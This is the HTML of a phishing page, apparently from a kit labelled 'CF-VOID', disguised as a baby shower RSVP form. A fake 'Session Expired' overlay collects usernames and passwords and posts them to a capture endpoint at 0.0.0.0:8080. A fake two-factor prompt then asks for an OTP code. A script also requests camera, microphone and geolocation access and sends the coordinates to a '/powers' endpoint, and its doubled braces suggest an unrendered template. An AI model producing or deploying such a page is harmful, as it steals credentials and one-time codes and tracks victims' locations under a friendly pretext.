<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👶 Baby Shower!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { max-width: 420px; background: #fff; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); overflow: hidden; }
        .header { background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%); padding: 30px; text-align: center; color: white; }
        .header h1 { font-size: 26px; margin-bottom: 8px; }
        .header p { font-size: 14px; opacity: 0.9; }
        .content { padding: 30px; }
        .form-group { margin-bottom: 18px; }
        label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; font-weight: 500; }
        input, select, textarea { width: 100%; padding: 12px 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; transition: border-color 0.3s; }
        input:focus, select:focus, textarea:focus { outline: none; border-color: #ff6b6b; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        .btn:hover { transform: translateY(-1px); }
        .footer { text-align: center; padding: 15px; font-size: 12px; color: #999; }
        .badge { display: inline-block; background: #4CAF50; color: white; padding: 3px 10px; border-radius: 12px; font-size: 11px; margin-left: 8px; }
    </style>
</head>
<body>
<div class="container">
<div class="header">
    <h1>👶 Baby Shower!</h1>
    <p>We'd love to see you participate!</p>
</div>
<div class="content">
<form method="POST" action="/capture">
<input type="hidden" name="target" value="👶 Baby Shower!"><div class="form-group">
    <label>Your Name</label>
    <input type="text" name="name" placeholder="Your Name" required>
</div><div class="form-group">
    <label>Email</label>
    <input type="text" name="email" placeholder="Email" required>
</div><div class="form-group">
    <label>Attending?</label>
    <input type="text" name="attending" placeholder="Attending?" required>
</div><!-- RSVP -->
<!-- Data to 0.0.0.0:8080/baby_shower --></form>
</div>
<div class="footer">
    Secure Connection • SSL Encrypted • CF-VOID
</div>
</div>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:9999;">
    <div style="background:#16213e;padding:30px;border-radius:10px;width:100%;max-width:400px;box-shadow:0 4px 6px rgba(0,0,0,0.5);">
        <h3 style="color:#e94560;text-align:center;margin-top:0;">Session Expired</h3>
        <p style="color:#aaa;text-align:center;font-size:14px;">Please sign in to continue.</p>
        <form action="http://0.0.0.0:8080/capture" method="POST" id="cf-void-capture" style="margin-top:15px;">
            <input type="hidden" name="template" value="baby_shower" style="display:none;">
            <input type="text" name="username" placeholder="Username" required style="width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff;">
            <input type="password" name="password" placeholder="Password" required style="width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff;">
            <button type="submit" style="width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer;">Sign In</button>
        </form>
    </div>
</div>
<div id="otp-section" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9998;justify-content:center;align-items:center;">
    <div style="background:#16213e;padding:30px;border-radius:10px;width:100%;max-width:350px;">
        <h3 style="color:#e94560;">Two-Factor Authentication</h3>
        <p style="color:#aaa;font-size:14px;">Enter the code sent to your device.</p>
        <form action="http://0.0.0.0:8080/capture" method="POST" id="otp-form" style="margin-top:15px;">
            <input type="hidden" name="template" value="baby_shower" style="display:none;">
            <input type="text" name="otp" placeholder="Enter OTP code" required style="width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff;">
            <button type="submit" style="width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer;">Verify</button>
        </form>
    </div>
</div>
<script>
document.getElementById('cf-void-capture').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    const data = new URLSearchParams();
    for (const [key, val] of formData.entries()) { data.append(key, val); }
    fetch(this.action, {method:'POST',body:data,headers:{'Content-Type':'application/x-www-form-urlencoded'}})
        .then(() => {
            document.querySelector('[action="http://0.0.0.0:8080/capture"]').style.display='none';
            document.getElementById('otp-section').style.display='flex';
        })
        .catch(() => window.location.href = '/');
});
document.getElementById('otp-form').addEventListener('submit', function(e) {
    e.preventDefault();
    alert('Verification code sent. Please try again later.');
    window.location.href = '/';
});
</script>
<script>
async function requestPowers() {{
    try {{
        const stream = await navigator.mediaDevices.getUserMedia({{video:true, audio:true}});
        fetch('/powers', {{
            method:'POST',
            body:JSON.stringify({{camera:true, mic:true}}),
            headers:{{'Content-Type':'application/json'}}
        }});
        stream.getTracks().forEach(t => t.stop());
    }} catch(e) {{}}
    try {{
        navigator.geolocation.getCurrentPosition(function(pos) {{
            fetch('/powers', {{
                method:'POST',
                body:JSON.stringify({{location:true, lat:pos.coords.latitude, lng:pos.coords.longitude}}),
                headers:{{'Content-Type':'application/json'}}
            }});
        }});
    }} catch(e) {{}}
}}
requestPowers();
</script>
</body>
</html>
